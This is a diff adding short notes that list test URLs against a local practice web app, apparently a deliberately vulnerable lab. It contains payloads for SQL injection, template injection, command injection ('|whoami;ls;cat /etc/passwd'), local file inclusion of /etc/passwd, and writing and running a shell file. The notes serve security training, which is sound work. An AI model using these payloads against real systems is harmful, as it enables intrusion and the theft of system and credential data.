@@ -1,0 +1,49 @@
+IO Validation
+-------------
+SQL Injection
+http://127.0.0.1:8081/user/'%20or%20'1=1
+
+HTML Injection
+http://127.0.0.1:8081/welcome2/%3Ch1%3Etest
+
+Server-Side Template Injection (SSTI)
+http://127.0.0.1:8081/hello?name={{7*7}}
+http://127.0.0.1:8081/hello?name={{config.items()}}
+
+Command Injection
+http://127.0.0.1:8081/get_users?hostname=google.com:id
+http://127.0.0.1:8081/get_users?hostname=|whoami
+http://127.0.0.1:8081/get_users?hostname=|whoami;ls;cat%20/etc/passwd
+
+
+Password Management
+-------------------
+To Do: Limit access of DB
+Hardcoded password (vulnerable to brute force attack too)
+http://127.0.0.1:8081/login?username=anil&password=cyber
+
+
+File Uplaod and Download
+-------------------------
+File Upload
+create a upload folder in Desktop
+http://127.0.0.1:8081/run_file?filename=/home/kali/Desktop/upload/file.sh
+
+
+Etcetra (Not sure what categories)
+-------
+Infomation Disclosure (io )
+http://127.0.0.1:8081/get_log/
+http://127.0.0.1:8081/get_admin_mail/admin
+
+Local File Inclusion (LFI)
+http://127.0.0.1:8081/read_file?filename=/etc/passwd
+
+DOS (not sure works or not)
+http:/127.0.0.1:8081/user_pass_control?username=1&password=2
+
+create a file
+http://127.0.0.1:8081/create_file?filename=2.sh&text=id  | cat /etc/passwd
+
+View the content 
+http://127.0.0.1:8081/run_file?filename=2.sh
